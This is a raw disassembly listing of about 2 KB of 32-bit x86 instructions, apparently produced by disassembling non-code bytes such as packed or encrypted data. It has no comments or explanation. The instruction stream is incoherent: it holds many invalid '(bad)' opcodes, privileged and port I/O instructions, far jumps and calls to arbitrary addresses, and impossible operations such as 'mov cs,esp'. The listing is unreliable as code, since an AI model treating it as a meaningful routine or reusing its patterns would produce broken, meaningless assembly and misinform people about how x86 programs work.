  4151df:	adc    BYTE PTR ss:[edi+0x50],0xb
  4151e4:	pop    ss
  4151e5:	ja     0x41523d
  4151e7:	push   eax
  4151e8:	inc    edx
  4151e9:	js     0x415203
  4151eb:	pop    ss
  4151ec:	push   es
  4151ed:	push   ss
  4151ee:	push   esi
  4151ef:	dec    esi
  4151f0:	aaa    
  4151f1:	xor    eax,0x4a01e33a
  4151f6:	push   edi
  4151f7:	add    BYTE PTR [edi],cl
  4151f9:	cmp    DWORD PTR [esi+0x3f],esp
  4151fc:	ja     0x41526b
  4151fe:	fsubr  st,st(2)
  415200:	push   ecx
  415201:	sbb    al,0xcb
  415203:	cmp    bh,BYTE PTR ds:0x1bbcb35b
  415209:	js     0x4151ef
  41520b:	xor    al,0x9c
  41520d:	push   ds
  41520e:	pop    edi
  41520f:	mov    edi,0x4608f5a
  415214:	scas   al,BYTE PTR es:[edi]
  415215:	cmp    al,0xbb
  415217:	nop
  415218:	mov    bl,0x73
  41521a:	cmp    BYTE PTR [eax],ch
  41521c:	mov    bl,0x3b
  41521e:	sahf   
  41521f:	jbe    0x41521b
  415221:	sub    cl,BYTE PTR [ebx-0x2b]
  415224:	pop    ecx
  415225:	adc    BYTE PTR [ebp+0x9],ah
  415228:	xchg   esp,eax
  415229:	xchg   edi,eax
  41522a:	jo     0x4151b5
  41522c:	fs aaa 
  41522e:	stc    
  41522f:	mov    edi,0xed1e5ada
  415234:	dec    esp
  415235:	loopne 0x4151d8
  415237:	xor    eax,0x32b16651
  41523c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41523d:	mov    al,ds:0x43be7df4
  415242:	add    bl,BYTE PTR [eax]
  415244:	xchg   BYTE PTR [ecx+0x50b9c997],ch
  41524a:	xchg   ebp,eax
  41524b:	clc    
  41524c:	sti    
  41524d:	mov    bl,0x1b
  41524f:	cmp    bh,BYTE PTR [ecx]
  415251:	pusha  
  415252:	adc    al,0xf
  415254:	sub    eax,0x21d57755
  415259:	mov    eax,es
  41525b:	and    al,0x1d
  41525d:	ins    DWORD PTR es:[edi],dx
  41525e:	inc    ecx
  41525f:	pop    ebp
  415261:	mov    cs,esp
  415263:	shr    bh,1
  415265:	push   ebx
  415266:	addr16 dec ecx
  415268:	fs nop
  41526a:	cmp    edx,DWORD PTR [ebx]
  41526c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41526e:	jnp    0x4152d2
  415270:	repz xor al,0xdf
  415273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415274:	addr16 std 
  415276:	xchg   ecx,eax
  415277:	ficomp WORD PTR [eax+0x36]
  41527a:	scas   eax,DWORD PTR es:[edi]
  41527b:	std    
  41527c:	mov    ah,0x34
  41527e:	fild   DWORD PTR [ecx]
  415280:	fidiv  DWORD PTR [edi]
  415282:	stos   DWORD PTR es:[edi],eax
  415283:	jmp    0x32e8:0x58afe772
  41528a:	dec    ebx
  41528b:	adc    edx,DWORD PTR [ebp+0x674c70f3]
  415291:	mov    ah,0x51
  415293:	inc    esi
  415294:	outs   dx,DWORD PTR ds:[esi]
  415295:	call   0x402bc68e
  41529a:	call   0x3d03:0x3f7bf78e
  4152a1:	and    eax,0xee781866
  4152a6:	mov    al,0x36
  4152a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a9:	push   esp
  4152aa:	pop    ebx
  4152ab:	xor    cl,BYTE PTR [ebx+0x77e130c3]
  4152b1:	fwait
  4152b2:	bnd jne 0x415264
  4152b5:	jno    0x4152e1
  4152b7:	mov    ebp,0x9d1e4814
  4152bc:	test   DWORD PTR cs:[eax-0x7e],ecx
  4152c0:	test   BYTE PTR [eax-0x6a3154f0],cl
  4152c6:	fs xchg esp,eax
  4152c8:	mov    dl,0x40
  4152ca:	les    esi,FWORD PTR [edi+0x6f046dd0]
  4152d0:	lock ins DWORD PTR es:[edi],dx
  4152d2:	test   BYTE PTR [esi-0x4f088463],0x3
  4152d9:	sar    BYTE PTR [esi],1
  4152db:	inc    ebx
  4152dc:	and    esp,DWORD PTR [ecx-0x506351ee]
  4152e2:	mov    dl,0xa6
  4152e4:	mov    edi,0xc45d414b
  4152e9:	shr    BYTE PTR [ebp+0x5517a218],cl
  4152ef:	jmp    WORD PTR [esi-0x3558521f]
  4152f6:	aam    0x5b
  4152f8:	(bad)  
  4152f9:	stos   DWORD PTR es:[edi],eax
  4152fa:	shl    DWORD PTR [eax-0x4f0d3fc1],cl
  415300:	dec    ebp
  415301:	(bad)  
  415302:	(bad)  
  415303:	and    dh,BYTE PTR [ebx]
  415305:	aaa    
  415306:	daa    
  415307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415308:	leave  
  415309:	cmp    BYTE PTR [esi+0xd4d04e2],ah
  41530f:	inc    edx
  415310:	jmp    0x1684a252
  415315:	repz jnp 0x415390
  415318:	ins    BYTE PTR es:[edi],dx
  415319:	dec    edx
  41531a:	pop    ss
  41531b:	nop
  41531c:	loopne 0x4152a9
  41531e:	xor    DWORD PTR [edx+0x37],ecx
  415321:	ds mov esi,0x1f7ef734
  415327:	mov    al,0x4e
  415329:	inc    eax
  41532a:	inc    edx
  41532b:	hlt    
  41532c:	dec    ecx
  41532d:	arpl   WORD PTR [esi+edi*2+0x42237fbf],bp
  415334:	sbb    DWORD PTR [ecx+0x5b94d5ab],edx
  41533a:	test   DWORD PTR [edi-0x48f76265],0x241aa693
  415344:	stos   DWORD PTR es:[edi],eax
  415345:	aas    
  415346:	and    ebp,DWORD PTR [edx-0x41a69b4f]
  41534c:	fbstp  TBYTE PTR [ebx-0x65]
  41534f:	lods   al,BYTE PTR ds:[esi]
  415350:	ret    0x6321
  415353:	cmp    BYTE PTR es:[edi-0x33],bh
  415357:	and    al,BYTE PTR [edi-0x67]
  41535a:	push   es
  41535b:	jge    0x4153ab
  41535d:	sbb    esp,DWORD PTR [edi+0x13bb0529]
  415363:	dec    edi
  415364:	xor    ecx,DWORD PTR [ebp+0x718e4c9c]
  41536a:	xchg   ebp,eax
  41536b:	pop    ebp
  41536c:	das    
  41536d:	cwde   
  41536e:	mov    bl,0x14
  415370:	loopne 0x4153e0
  415372:	mov    dl,0xd5
  415374:	mov    edi,0x576af008
  415379:	(bad)  
  41537a:	rol    BYTE PTR [eax-0x1a],0xf0
  41537e:	xchg   esp,eax
  41537f:	xor    ecx,ecx
  415381:	cs mov dl,0x9c
  415384:	push   es
  415385:	mov    ah,0x35
  415387:	and    BYTE PTR [ebx+0x32],dh
  41538a:	sub    BYTE PTR [ecx],0xaa
  41538d:	push   edx
  41538e:	push   cs
  41538f:	jne    0x4153dc
  415391:	add    cl,BYTE PTR [edx]
  415393:	jge    0x4153e0
  415395:	or     esp,DWORD PTR [eax+0xc181e25]
  41539b:	fcom   QWORD PTR [ecx]
  41539d:	sbb    al,0x1
  41539f:	mov    DWORD PTR [ebx],edx
  4153a1:	mov    al,ds:0xf8509a51
  4153a6:	or     al,0x7e
  4153a8:	cmp    eax,0x4cac48c5
  4153ad:	cli    
  4153ae:	hlt    
  4153af:	test   al,0xe0
  4153b1:	ret    
  4153b2:	and    cl,ch
  4153b4:	into   
  4153b5:	fmul   QWORD PTR [esi]
  4153b7:	aas    
  4153b8:	rol    ah,cl
  4153ba:	daa    
  4153bb:	les    ecx,FWORD PTR [ebx]
  4153bd:	add    BYTE PTR [edx+0x77],0x3
  4153c1:	das    
  4153c2:	mov    cl,0x5b
  4153c4:	xchg   edi,eax
  4153c5:	fwait
  4153c6:	inc    edi
  4153c7:	jl     0x4153e5
  4153c9:	ret    0x7454
  4153cc:	pop    edx
  4153cd:	push   ebx
  4153ce:	mov    ecx,0x7b55219c
  4153d3:	lods   eax,DWORD PTR ds:[esi]
  4153d4:	data16 mov cl,0x78
  4153d7:	push   esi
  4153d8:	in     eax,0x16
  4153da:	stc    
  4153db:	jl     0x41541e
  4153dd:	xchg   DWORD PTR [ecx],ebp
  4153df:	jmp    0xfc0c:0x2c76a234
  4153e6:	mov    bh,0x45
  4153e8:	mov    dl,0x2d
  4153ea:	push   ss
  4153eb:	or     al,0xcb
  4153ed:	ds adc eax,0xfa1d3d6d
  4153f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f4:	push   cs
  4153f5:	xchg   ecx,eax
  4153f6:	lahf   
  4153f7:	scas   eax,DWORD PTR es:[edi]
  4153f8:	and    cl,dl
  4153fa:	cs sbb al,0x70
  4153fd:	push   cs
  4153fe:	adc    al,0xee
  415400:	div    BYTE PTR [edi]
  415402:	pop    esp
  415403:	mul    BYTE PTR [edx+0x7c6589f0]
  415409:	mov    ecx,0xdfe0eb51
  41540e:	mov    dl,0x84
  415410:	xor    ecx,DWORD PTR [ebx+0x3b]
  415413:	lods   eax,DWORD PTR ds:[esi]
  415414:	push   es
  415415:	pop    es
  415416:	push   esp
  415417:	jb     0x4153ce
  415419:	in     al,0x6e
  41541b:	xchg   esp,eax
  41541c:	mov    ecx,0xe5f9ec3b
  415421:	dec    edi
  415422:	dec    ebp
  415423:	inc    eax
  415424:	pop    ebx
  415425:	push   esp
  415426:	jno    0x4153bd
  415428:	ds mov esi,0xf7887a07
  41542e:	push   edi
  41542f:	xor    al,0x2b
  415431:	stc    
  415432:	push   es
  415433:	loop   0x4153cc
  415435:	bound  esi,QWORD PTR [ebx+0xc9590b8]
  41543b:	inc    esi
  41543c:	inc    ebx
  41543d:	call   0x110e6cc3
  415442:	call   0x2364:0xd468e15d
  415449:	lock push ds
  41544b:	xchg   ecx,eax
  41544c:	das    
  41544d:	mov    ch,0xe8
  41544f:	mov    ds:0xcac85e64,eax
  415454:	cmp    eax,0x67a66cfc
  415459:	fist   DWORD PTR [ebx+0x2d93f4d9]
  41545f:	xchg   BYTE PTR [edx+eiz*8],ch
  415462:	std    
  415463:	or     al,0xad
  415465:	retf   0xb957
  415468:	mov    ecx,0xe3e4f477
  41546d:	mov    cl,0x17
  41546f:	fnstenv [edx]
  415471:	pop    ebx
  415472:	ja     0x415466
  415474:	inc    ebx
  415475:	inc    ecx
  415476:	fild   QWORD PTR [eax*1-0x5c1b91fc]
  41547d:	jecxz  0x4154be
  41547f:	xchg   edi,eax
  415480:	ja     0x41548f
  415482:	rcl    DWORD PTR [edx+0x2b],1
  415485:	mov    BYTE PTR [esi-0x77],al
  415488:	scas   eax,DWORD PTR es:[edi]
  415489:	dec    esp
  41548a:	jl     0x4154d1
  41548c:	dec    edi
  41548d:	lods   eax,DWORD PTR ds:[esi]
  41548e:	ins    DWORD PTR es:[edi],dx
  41548f:	cmp    eax,0x3c9fd25e
  415494:	aaa    
  415495:	dec    esi
  415496:	std    
  415497:	int3   
  415498:	pop    esi
  415499:	adc    ch,dl
  41549b:	jmp    0x7e5a:0x61a3340
  4154a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a3:	fcom   QWORD PTR [edi+0x5e]
  4154a6:	mov    ch,0x5e
  4154a8:	pop    ecx
  4154a9:	addr16 call 0x91bd:0x408444e3
  4154b1:	adc    eax,0xe1616ff9
  4154b6:	stos   DWORD PTR es:[edi],eax
  4154b7:	imul   ecx,ebx,0x10
  4154ba:	cdq    
  4154bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154bc:	push   cs
  4154bd:	add    DWORD PTR [ecx],esi
  4154bf:	jge    0x4154fe
  4154c1:	push   ebp
  4154c2:	dec    ebx
  4154c3:	cmp    cl,ah
  4154c5:	xchg   esp,eax
  4154c6:	test   al,0xc2
  4154c8:	fs cwde 
  4154ca:	scas   eax,DWORD PTR es:[edi]
  4154cb:	jno    0x415490
  4154cd:	xlat   BYTE PTR ds:[ebx]
  4154ce:	xchg   edx,eax
  4154cf:	add    DWORD PTR [eax+0xf8a1a97],esp
  4154d5:	jg     0x41549e
  4154d7:	imul   edi,DWORD PTR [edx+0x479cdec],0x79
  4154de:	push   ds
  4154df:	es inc ecx
  4154e1:	jo     0x415547
  4154e3:	add    bl,BYTE PTR ds:[ecx-0x80]
  4154e7:	push   0x194a3eea
  4154ec:	adc    BYTE PTR ds:0xc8d42fab,cl
  4154f2:	push   ecx
  4154f3:	adc    dl,BYTE PTR [ebx+0x752c22c0]
  4154f9:	(bad)  
  4154fa:	pop    ss
  4154fb:	call   0x12f55a27
  415500:	loop   0x415522
  415502:	retf   
  415503:	jge    0x415496
  415505:	mov    dl,BYTE PTR [esi-0x5d66415b]
  41550b:	sbb    ebx,DWORD PTR [edi]
  41550d:	ret    
  41550e:	cmp    BYTE PTR [eax+0x5],0xb8
  415512:	sbb    DWORD PTR [ebx*4+0x53218ed1],edx
  415519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41551a:	(bad)  
  41551b:	ins    BYTE PTR es:[edi],dx
  41551c:	sub    eax,0x62660ebb
  415521:	mov    esp,edi
  415523:	mov    al,0x29
  415525:	dec    eax
  415526:	pop    edx
  415527:	popf   
  415528:	or     BYTE PTR [esp+ecx*1],bl
  41552b:	xor    bh,BYTE PTR [eax+esi*4]
  41552e:	xchg   DWORD PTR [esi-0x259eb773],esi
  415534:	mov    ch,0x9b
  415536:	mov    eax,0xca7a1ac9
  41553b:	xchg   esp,eax
  41553c:	and    BYTE PTR [eax+edx*4-0x40],ah
  415540:	in     al,0x4c
  415542:	outs   dx,BYTE PTR ds:[esi]
  415543:	inc    edx
  415544:	add    BYTE PTR [ebp+0x70e2d87e],0x67
  41554b:	repz xchg esi,eax
  41554d:	mov    esi,0xeb2f74f9
  415552:	pop    ebp
  415553:	push   cs
  415554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415555:	inc    ebp
  415556:	push   esp
  415557:	gs call 0x9edb:0xb1f2cbb2
  41555f:	or     dl,bl
  415561:	xchg   edi,eax
  415562:	repnz sar DWORD PTR [ebx+eax*1+0x55361b1e],0xf9
  41556b:	jmp    0x130413c3
  415570:	nop
  415571:	mov    edx,0x19b873aa
  415576:	pop    eax
  415577:	nop
  415578:	repnz inc ecx
  41557a:	out    dx,eax
  41557b:	rol    BYTE PTR [edx+0x2d],0xa0
  41557f:	aad    0x75
  415581:	retf   
  415582:	lods   eax,DWORD PTR ds:[esi]
  415583:	cmc    
  415584:	ror    DWORD PTR [ebx+0x28],1
  415587:	fisttp DWORD PTR [ebx]
  415589:	(bad)  
  41558a:	(bad)  
  41558c:	addr16 test al,0x2d
  41558f:	cmp    eax,0x7a0d5673
  415594:	call   0x4c695501
  415599:	mov    BYTE PTR [ebx+0x29808226],bh
  41559f:	les    eax,FWORD PTR [ecx]
  4155a1:	jmp    FWORD PTR [edx+0x1c46405a]
  4155a7:	adc    DWORD PTR [ebx+0x33e2fb17],ecx
  4155ad:	std    
  4155ae:	adc    DWORD PTR [edx-0x389c9e3e],0xffffffc0
  4155b5:	(bad)  
  4155b6:	call   0xd0fef7eb
  4155bb:	pop    esi
  4155bc:	push   ds
  4155bd:	or     al,0xb6
  4155bf:	sahf   
  4155c0:	scas   al,BYTE PTR es:[edi]
  4155c1:	add    dh,0x55
  4155c4:	jmp    0x98a5:0x3c1dca55
  4155cb:	(bad)  
  4155cc:	and    BYTE PTR [esi],dl
  4155ce:	jmp    0x954cee7f
  4155d3:	or     DWORD PTR [ecx],ebp
  4155d5:	mov    ch,al
  4155d7:	mov    al,ds:0x7bb18d27
  4155dc:	les    ebp,FWORD PTR [ebx]
  4155de:	inc    edx
  4155df:	outs   dx,BYTE PTR ds:[esi]
  4155e0:	stc    
  4155e1:	inc    ebx
  4155e2:	xchg   ebp,eax
  4155e3:	dec    esp
  4155e4:	mov    eax,ds:0xeae87efc
  4155e9:	sub    al,BYTE PTR [ebp-0x2ba71d6c]
  4155ef:	sbb    eax,0x5c2a38c
  4155f4:	add    DWORD PTR [edi+0x797f5cbd],0x18f8e27a
  4155fe:	lea    ecx,[ecx+0x1b71376d]
  415604:	bound  ebx,QWORD PTR [ecx-0x1cd07706]
  41560a:	mov    dl,0x2
  41560c:	stc    
  41560d:	ja     0x41561f
  41560f:	gs jno 0x415594
  415612:	pop    ebp
  415613:	ja     0x415606
  415615:	lea    ecx,[edi+ebx*8+0x11]
  415619:	mov    eax,ds:0xb70e9a4
  41561e:	retf   0xc59c
  415621:	pop    es
  415622:	into   
  415623:	ret    
  415624:	pusha  
  415625:	call   0x2daccd04
  41562a:	imul   ebx,DWORD PTR [ebp-0x40269112],0x2f5691a6
  415634:	out    dx,al
  415635:	test   bl,0x30
  415638:	mul    BYTE PTR [esi+ebp*4+0x58]
  41563c:	sub    eax,esi
  41563e:	inc    eax
  41563f:	arpl   WORD PTR [esi],di
  415641:	jge    0x41560e
  415643:	cmp    dh,ah
  415645:	jmp    0x2eb:0x6bb0c6f4
  41564c:	sbb    esp,edi
  41564e:	scas   eax,DWORD PTR es:[edi]
  41564f:	jmp    0x41562d
  415651:	mul    ebp
  415653:	adc    eax,0x6612abeb
  415658:	dec    ebx
  415659:	mov    ds:0x42d3f453,al
  41565e:	add    eax,0xf95f858e
  415663:	in     al,0xda
  415665:	pushf  
  415666:	inc    edi
  415667:	or     dh,BYTE PTR [edx-0x6c20e3b4]
  41566d:	retf   0x5452
  415670:	and    bl,BYTE PTR [edi]
  415672:	and    ecx,DWORD PTR [edx]
  415674:	int3   
  415675:	jns    0x415682
  415677:	bnd jge 0x4156eb
  41567a:	and    al,0x89
  41567c:	and    eax,0x4e2a773a
  415681:	or     ebp,DWORD PTR [esi]
  415683:	(bad)  
  415685:	or     BYTE PTR [ecx-0x23f2e31b],ah
  41568b:	pop    ebp
  41568c:	call   0x5557:0xaaae6ae9
  415693:	mov    ss,WORD PTR [esi+0x73]
  415696:	sti    
  415697:	(bad)  
  415699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41569a:	retf   
  41569b:	pushf  
  41569c:	ret    
  41569d:	xor    al,0x5b
  41569f:	(bad)  
  4156a0:	jns    0x4156f5
  4156a2:	js     0x4156b1
  4156a4:	pop    esp
  4156a5:	and    eax,0x93756edc
  4156aa:	jmp    0x25dbab2c
  4156af:	loop   0x41569c
  4156b1:	lock popa 
  4156b3:	and    DWORD PTR [edx+ebx*4+0x3a5786e6],ebp
  4156ba:	daa    
  4156bb:	in     eax,0x12
  4156bd:	sti    
  4156be:	scas   eax,DWORD PTR es:[edi]
  4156bf:	adc    ebp,DWORD PTR [ebx]
  4156c1:	or     DWORD PTR [ebx],0xb7ed9a49
  4156c7:	adc    al,0x68
  4156c9:	xchg   esp,eax
  4156ca:	int3   
  4156cb:	xchg   esi,eax
  4156cc:	outs   dx,DWORD PTR ds:[esi]
  4156cd:	jmp    0xc2058cbe
  4156d2:	sbb    eax,0x69dcfdd6
  4156d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d8:	popa   
  4156d9:	push   edi
  4156da:	mov    dh,0xe1
  4156dc:	popa   
  4156dd:	jno    0x41573c
  4156df:	xor    edx,esp
  4156e1:	inc    ebp
  4156e2:	rcl    DWORD PTR [ebx+0x5a],1
  4156e5:	ja     0x415753
  4156e7:	sti    
  4156e8:	sub    dh,BYTE PTR [esi+0x74418c6e]
  4156ee:	cwde   
  4156ef:	retf   
  4156f0:	mov    ds:0xd6e6b7e6,eax
  4156f5:	add    al,0x3f
  4156f7:	pop    ds
  4156f8:	pop    esi
  4156f9:	xlat   BYTE PTR ds:[ebx]
  4156fa:	fwait
  4156fb:	into   
  4156fc:	dec    edi
  4156fd:	adc    BYTE PTR [edi+0x208492b2],ch
  415703:	dec    edx
  415704:	jb     0x415708
  415706:	jl     0x4156ec
  415708:	ret    
  415709:	ds cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41570c:	outs   dx,BYTE PTR ds:[esi]
  41570d:	rcl    BYTE PTR [edx+0x5bf84cd2],1
  415713:	mov    gs,WORD PTR [ecx+ebx*1-0x51]
  415717:	out    0x19,eax
  415719:	cmp    eax,0xc9e28964
  41571e:	mov    edx,0x60065509
  415723:	sbb    al,0x97
  415725:	xchg   ecx,eax
  415726:	inc    edi
  415727:	mov    ecx,0x5e9dabc5
  41572c:	out    dx,al
  41572d:	add    eax,0x63e2be23
  415732:	(bad)
  415735:	mov    bh,0xf8
  415737:	jl     0x415752
  415739:	or     al,0x6e
  41573b:	cmc    
  41573c:	stc    
  41573d:	xor    BYTE PTR [esi+0x4267b696],dh
  415743:	es retf 
  415745:	cmp    ebp,esp
  415747:	loopne 0x415750
  415749:	popf   
  41574a:	ror    DWORD PTR [ebx+0x3f],1
  41574d:	push   ds
  41574e:	jne    0x4156f5
  415750:	ficom  WORD PTR [edx+0x3fa82bd7]
  415756:	add    ecx,ebx
  415758:	(bad)  [edi+0x7ff12dd3]
  41575e:	inc    edi
  41575f:	push   0x70aa9963
  415764:	sbb    dh,BYTE PTR [ebp-0x13]
  415767:	xor    DWORD PTR [ebx-0x14053a64],eax
  41576d:	and    eax,0xbe3acae1
  415772:	cli    
  415773:	push   0x41c5840
  415778:	sub    eax,0x88d8fdb2
  41577d:	test   BYTE PTR [esi],bl
  41577f:	imul   ecx,DWORD PTR [ecx-0x4e363994],0x3a
  415786:	bnd jp 0x41578e
  415789:	pop    ds
  41578a:	and    eax,0x310bf0b9
  41578f:	push   ebp
  415790:	push   ecx
  415791:	and    DWORD PTR [edi],esi
  415793:	dec    ebx
  415794:	jns    0x41577a
  415796:	cwde   
  415797:	adc    DWORD PTR [edi+eiz*1],edi
  41579a:	stc    
  41579b:	pop    es
  41579c:	pop    edi
  41579d:	lds    esi,FWORD PTR [ebx+esi*2]
  4157a0:	mov    edx,0xf415dbcc
  4157a5:	mov    dh,0xb0
  4157a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157a8:	mov    esi,0x64fca9a4
  4157ad:	jecxz  0x41578f
  4157af:	imul   ebx,esi,0xffffffdf
  4157b2:	nop
  4157b3:	sub    dl,ch
  4157b5:	out    dx,al
  4157b6:	cdq    
  4157b7:	xchg   edx,eax
  4157b8:	sbb    bl,al
  4157ba:	mov    ebp,DWORD PTR [eax]
  4157bc:	das    
  4157bd:	addr16 xor dh,dh
  4157c0:	xchg   edi,eax
  4157c1:	fst    QWORD PTR [ecx+0x56]
  4157c4:	addr16 mov dl,0x2e
  4157c7:	add    ecx,DWORD PTR [ebx]
  4157c9:	mov    eax,DWORD PTR [ecx+0x77]
  4157cc:	xchg   DWORD PTR [ecx+0xcfd629b],edi
  4157d2:	jo     0x4157a2
  4157d4:	or     eax,0x553509cd
  4157d9:	and    BYTE PTR [ebx],cl
  4157db:	xor    bh,BYTE PTR [ebp-0x78]
  4157de:	adc    al,0xfd
  4157e0:	sahf   
  4157e1:	retf   
  4157e2:	sub    dh,BYTE PTR [edi]
  4157e4:	jge    0x415831
  4157e6:	pop    esi
  4157e7:	or     DWORD PTR [edx-0x2043777c],0x11
  4157ee:	add    eax,0x174b073f
  4157f3:	je     0x4157a9
  4157f5:	outs   dx,DWORD PTR ds:[esi]
  4157f6:	jp     0x415857
  4157f8:	xchg   esi,eax
  4157f9:	mov    eax,ds:0xdfb63cad
  4157fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157ff:	cmc    
  415800:	inc    ecx
  415801:	cld    
  415802:	mov    eax,ds:0x7011640b
  415807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415808:	ins    DWORD PTR es:[edi],dx
  415809:	mov    dh,0xa
  41580b:	xchg   ebp,eax
  41580c:	adc    DWORD PTR [ebx-0x7c22a5a1],esi
  415812:	jge    0x4157e8
  415814:	(bad)  
  415815:	xchg   edi,eax
  415816:	xlat   BYTE PTR ds:[ebx]
  415817:	stos   BYTE PTR es:[edi],al
  415818:	jbe    0x415882
  41581a:	inc    ebx
  41581b:	test   eax,0x843c20f7
  415820:	add    DWORD PTR [edi],ebp
  415822:	iret   
  415823:	add    BYTE PTR [ecx+0x3e136cb3],cl
  415829:	and    BYTE PTR [edx+0x54],dl
  41582c:	mov    ds:0x6153c4d1,eax
  415831:	hlt    
  415832:	test   eax,0x1bfc3e5f
  415837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415838:	mov    esi,edx
  41583a:	push   0x73
  41583c:	int    0x85
  41583e:	vdivps xmm2,xmm5,XMMWORD PTR [ecx+esi*2-0x33]
  415844:	mov    ah,0x66
  415846:	lahf   
  415847:	add    BYTE PTR [esp+eiz*2+0x4d5e99fd],0x5b
  41584f:	cmc    
  415850:	push   ebx
  415851:	(bad)  
  415853:	xchg   ebx,eax
  415854:	lea    ebx,[ebx-0x1b]
  415857:	dec    ecx
  415858:	push   esi
  415859:	mov    es:0x4dd0b8f3,al
  41585f:	and    cl,BYTE PTR [edi+0xf94e403]
  415865:	or     BYTE PTR [edi-0x69],bl
  415868:	mov    DWORD PTR [ebx],0xe66178f3
  41586e:	xchg   DWORD PTR [edx+0x3d483a2d],edi
  415874:	mov    BYTE PTR [edx-0x58],ch
  415877:	xor    al,0x91
  415879:	mov    esp,0xff87482f
  41587e:	inc    ecx
  41587f:	pop    esi
  415880:	cli    
  415881:	and    eax,0x8ca0dc24
  415886:	nop
  415887:	cld    
  415888:	shl    ch,1
  41588a:	xor    ebx,edx
  41588c:	out    dx,eax
  41588d:	mov    bh,0x3c
  41588f:	jb     0x415851
  415891:	xchg   ebx,eax
  415892:	daa    
  415893:	cli    
  415894:	mov    ah,0xdf
  415896:	adc    bh,dh
  415898:	jo     0x415895
  41589a:	dec    edi
  41589b:	stos   BYTE PTR es:[edi],al
  41589c:	and    DWORD PTR [esi-0x39],eax
  41589f:	cs loop 0x4158ce
  4158a2:	js     0x4158da
  4158a4:	dec    eax
  4158a5:	stos   DWORD PTR es:[di],eax
  4158a7:	sbb    eax,0x7ee6489
  4158ac:	jae    0x4158f0
  4158ae:	cld    
  4158af:	mov    dh,0x7c
  4158b1:	sub    al,BYTE PTR [ecx]
  4158b3:	pop    ebp
  4158b4:	xchg   edi,eax
  4158b5:	stc    
  4158b6:	push   0x21
  4158b8:	cmpxchg8b QWORD PTR [esi+0x24]
  4158bc:	cwde   
  4158bd:	jp     0x4158a1
  4158bf:	xor    ecx,ebx
  4158c1:	mov    eax,0xf2207927
  4158c6:	lods   eax,DWORD PTR ds:[esi]
  4158c7:	mov    ecx,ebp
  4158c9:	jp     0x41584e
  4158cb:	ins    DWORD PTR es:[edi],dx
  4158cc:	jl     0x415893
  4158ce:	aam    0x93
  4158d0:	mov    ch,0x1c
  4158d2:	addr16 xor eax,0x196ea53c
  4158d8:	jne    0x41591c
  4158da:	fadd   QWORD PTR ds:0x57786a44
  4158e0:	push   ebp
  4158e1:	mov    cl,0xb3
  4158e3:	loopne 0x4158dd
  4158e5:	cmp    ah,al
  4158e7:	mov    dl,0x6a
  4158e9:	(bad)
  4158ed:	mov    dh,al
  4158ef:	arpl   WORD PTR [ecx],bp
  4158f1:	mov    cl,0x5b
  4158f3:	or     BYTE PTR [ebp+0x6129f606],cl
  4158f9:	pop    ss
  4158fa:	nop
  4158fb:	sbb    al,0xd3
  4158fd:	push   cs
  4158fe:	ins    DWORD PTR es:[di],dx
  415900:	adc    eax,0x71d8444d
  415905:	je     0x415903
  415907:	mov    al,0x80
  415909:	retf   
  41590a:	sahf   
  41590b:	add    al,0x1e
  41590d:	mov    dh,BYTE PTR [ebp+0x107fffde]
  415913:	lahf   
  415914:	out    0xdd,al
  415916:	test   BYTE PTR [eax],ch
  415918:	imul   ebp,DWORD PTR [ecx+0x325730da],0xffffffff
  41591f:	fnstenv [ecx-0x21923def]
  415925:	lods   al,BYTE PTR ds:[esi]
  415926:	pushf  
  415927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415928:	call   0xe740e40d
  41592d:	cld    
  41592e:	das    
  41592f:	loope  0x415907
  415931:	call   FWORD PTR [eax]
  415933:	fnstcw WORD PTR [edi]
  415935:	xchg   BYTE PTR [eax+0x7ca8f61c],ch
  41593b:	in     eax,dx
  41593c:	scas   al,BYTE PTR es:[edi]
  41593d:	mov    ebp,0x188270b8
  415942:	jae    0x4158ee
  415944:	mov    ecx,0x1c8669df
  415949:	ins    DWORD PTR es:[edi],dx
  41594a:	mov    BYTE PTR [esi-0x13],dh
  41594d:	test   al,0xbc
  41594f:	and    ah,ah
  415951:	jle    0x4158f4
  415953:	xchg   DWORD PTR [esi-0x59],edi
  415956:	mov    ebx,0x65fafa3b
  41595b:	jmp    FWORD PTR [ebx-0x15]
  41595e:	adc    ah,BYTE PTR [esi-0x16]
  415961:	ds add al,0x6f
  415964:	xchg   ecx,eax
  415965:	repz push 0x7
  415968:	js     0x4158eb
  41596a:	addr16 xchg ebx,eax
  41596c:	clc    
  41596d:	gs ins DWORD PTR es:[edi],dx
  41596f:	xchg   edi,eax
  415970:	mov    ebx,0x7644f7c4
  415975:	add    bh,BYTE PTR ds:0x7c033ea0
  41597b:	repz and al,BYTE PTR [ebx+ebx*4]
  41597f:	es ret 
  415981:	outs   dx,BYTE PTR ds:[esi]
  415982:	dec    esi
  415983:	popf   
  415984:	gs inc edx
  415986:	out    0xdb,al
  415988:	fisttp DWORD PTR [ebp+0x1cef0113]
  41598e:	mov    esi,0x18b50468
  415993:	add    edi,DWORD PTR [edx+0x13]
  415996:	clc    
  415997:	retf   
  415998:	jns    0x4159db
  41599a:	fs hlt 
  41599c:	push   ds
  41599d:	cmp    bh,dl
  41599f:	mov    cl,BYTE PTR [eax]
  4159a1:	mov    edi,0x39ab0540
  4159a6:	jp     0x415992
  4159a8:	lds    ebp,FWORD PTR [edx-0x2d]
  4159ab:	adc    BYTE PTR [edi+0x3c],dh
  4159ae:	mov    eax,ds:0xf13355da
  4159b3:	call   0xc9ee:0x56df1e89
  4159ba:	mov    esp,0x6586f791
